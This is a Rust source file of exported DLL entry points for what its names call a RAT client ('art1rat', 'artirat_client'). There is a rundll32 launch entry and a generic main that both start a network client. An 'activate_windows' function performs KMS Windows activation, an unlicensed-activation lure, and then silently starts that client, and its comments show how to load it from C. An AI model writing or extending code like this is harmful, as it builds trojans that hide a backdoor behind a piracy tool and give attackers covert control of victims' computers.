use std::ffi::c_int;

/// Entry point for DLL/SO loads.
/// Windows rundll32: rundll32.exe <dllpath>,NetClientMain
#[unsafe(export_name = "NetClientMain")]
pub extern "C" fn NetClientMain() {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(crate::netclient_dll());
}

/// Generic C-callable entry point.
#[unsafe(export_name = "art1rat_main")]
pub extern "C" fn art1rat_main() -> c_int {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(crate::netclient_dll());
    0
}

/// Activate Windows via KMS (upgrades Home -> Professional if needed),
/// then starts the netclient.
///
/// Returns 0 on success (activation + netclient started), 1 on failure.
///
/// # Calling from C
///
/// ```c
/// extern int activate_windows(void);
///
/// int main() {
///     int ret = activate_windows();
///     if (ret == 0) {
///         // Activation succeeded, netclient is running
///     } else {
///         // Activation failed
///     }
///     return ret;
/// }
/// ```
///
/// Compile with:
/// ```text
/// gcc -o myapp myapp.c -lartirat_client
/// ```
///
/// When loading dynamically (Windows):
/// ```c
/// typedef int (*activate_windows_fn)(void);
/// HMODULE hMod = LoadLibraryA("artirat_client.dll");
/// activate_windows_fn fn = (activate_windows_fn)GetProcAddress(hMod, "activate_windows");
/// int ret = fn();
/// ```
#[unsafe(export_name = "activate_windows")]
pub extern "C" fn activate_windows() -> c_int {
    if crate::activate::activate_windows_impl().is_err() {
        return 1;
    }
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(crate::netclient_dll());
    0
}
